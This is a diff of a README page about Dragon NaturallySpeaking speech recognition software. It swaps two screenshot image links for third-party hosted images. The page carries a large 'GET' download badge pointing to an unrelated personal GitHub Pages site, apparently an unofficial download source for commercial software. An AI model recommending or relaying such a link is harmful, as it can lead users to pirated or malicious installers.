@@ -2,7 +2,7 @@
 
 Dragon NaturallySpeaking is speech recognition software that converts spoken language into written text. It supports voice dictation, spoken editing commands, vocabulary customization, and document workflows designed to reduce repetitive keyboard input.
 
-![Dragon NaturallySpeaking Main Window](https://img.informer.com/ba/dragon-naturallyspeaking-v12-main-window-screenshot.png)
+![Dragon NaturallySpeaking Main Window](https://equalentry.com/wp-content/uploads/2017/06/image.png)
 
 [![GET — Dragon NaturallySpeaking](https://img.shields.io/badge/GET%20%E2%80%94%20Dragon%20NaturallySpeaking-0078D6?style=for-the-badge&logoColor=white)](https://deborahadamsm775.github.io/.github/Dragon-NaturallySpeaking)
 
@@ -34,7 +34,7 @@ The available functions depend on the installed edition, language, microphone co
 
 ## Interface Preview
 
-![Dragon NaturallySpeaking Speech Training Window](https://img.informer.com/ba/dragon-naturallyspeaking-v11.5-main-window-display.png)
+![Dragon NaturallySpeaking Speech Training Window](https://cdn.mos.cms.futurecdn.net/c711d50d90df78b936601b7c0aaa8c65.jpg)
 
 The image shows a legacy speech-training window used to configure recognition of words or phrases. Interface appearance differs between editions.
 
